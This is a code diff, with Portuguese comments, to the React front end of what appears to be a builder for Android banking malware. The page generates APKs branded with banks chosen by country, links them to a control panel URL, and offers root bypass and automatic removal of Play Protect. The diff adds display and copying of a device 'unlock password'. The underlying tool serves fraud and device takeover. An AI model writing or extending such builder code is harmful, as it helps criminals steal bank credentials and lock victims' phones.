@@ -2,7 +2,7 @@ import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Card } from "@/components/ui/card";
-import { Download, Loader2, Smartphone, Shield, ShieldCheck } from "lucide-react";
+import { Download, Loader2, Smartphone, Shield, ShieldCheck, Copy, Check } from "lucide-react";
 import { BANKS_BY_COUNTRY, getBankName } from "../../../shared/banks";
 import { trpc } from "@/lib/trpc";
 import { useNavigate } from "react-router-dom";
@@ -24,6 +24,10 @@ export default function APKBuilderPage() {
   const [buildProgress, setBuildProgress] = useState(0);
   const [downloadUrl, setDownloadUrl] = useState<string | null>(null);
   const [buildId, setBuildId] = useState<string | null>(null);
+  
+  // ✅ ADICIONADO: Estados para a senha de desbloqueio
+  const [unlockPassword, setUnlockPassword] = useState<string | null>(null);
+  const [copiedPassword, setCopiedPassword] = useState(false);
 
   const navigate = useNavigate();
   const generateAPK = trpc.apk.generate.useMutation();
@@ -47,6 +51,7 @@ export default function APKBuilderPage() {
 
     setIsBuilding(true);
     setBuildProgress(0);
+    setUnlockPassword(null); // ✅ Limpar senha anterior
 
     try {
       const normalizedPanelUrl = toRequiredValidUrl(companyUrl);
@@ -78,6 +83,11 @@ export default function APKBuilderPage() {
 
       setBuildId(result.buildId);
       setBuildProgress(10);
+      
+      // ✅ ADICIONADO: Armazenar a senha retornada
+      if (result.unlockPassword) {
+        setUnlockPassword(result.unlockPassword);
+      }
     } catch (error) {
       alert('Erro ao iniciar geração do APK');
       setIsBuilding(false);
@@ -106,6 +116,15 @@ export default function APKBuilderPage() {
 
     return () => window.clearTimeout(timer);
   }, [status, buildId, isBuilding, companyName, companyUrl, logoUrl, navigate]);
+
+  // ✅ ADICIONADO: Função para copiar a senha
+  const handleCopyPassword = () => {
+    if (unlockPassword) {
+      navigator.clipboard.writeText(unlockPassword);
+      setCopiedPassword(true);
+      setTimeout(() => setCopiedPassword(false), 2000);
+    }
+  };
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-slate-950 via-blue-950 to-slate-950 p-6">
@@ -361,6 +380,31 @@ export default function APKBuilderPage() {
                   </Button>
                 </div>
               )}
+
+              {/* ✅ ADICIONADO: Exibir a senha de desbloqueio */}
+              {unlockPassword && (
+                <div className="mt-4 p-4 bg-purple-900/20 border border-purple-400/30 rounded-lg">
+                  <p className="text-purple-300 text-sm font-semibold mb-2">🔐 Senha de Desbloqueio</p>
+                  <div className="flex items-center gap-2">
+                    <div className="flex-1 bg-slate-800/50 border border-purple-400/30 rounded px-3 py-2">
+                      <p className="text-white font-mono text-lg tracking-widest">{unlockPassword}</p>
+                    </div>
+                    <Button
+                      onClick={handleCopyPassword}
+                      className="bg-purple-600 hover:bg-purple-700 text-white px-3 py-2"
+                    >
+                      {copiedPassword ? (
+                        <Check className="w-4 h-4" />
+                      ) : (
+                        <Copy className="w-4 h-4" />
+                      )}
+                    </Button>
+                  </div>
+                  <p className="text-xs text-purple-300 mt-2">
+                    ⚠️ Guarde esta senha com segurança. É necessária para desbloquear o dispositivo.
+                  </p>
+                </div>
+              )}
             </div>
           </Card>
 
@@ -412,6 +456,7 @@ export default function APKBuilderPage() {
                   <li>✓ Tema corporativo</li>
                   {enableRootBypass && <li>✓ Bypass Root Completo</li>}
                   {enablePlayProtectBypass && <li>✓ Desinstalação Automática do Play Protect</li>}
+                  {unlockPassword && <li>✓ Senha de Desbloqueio: {unlockPassword.substring(0, 2)}***</li>}
                 </ul>
               </div>
             </div>
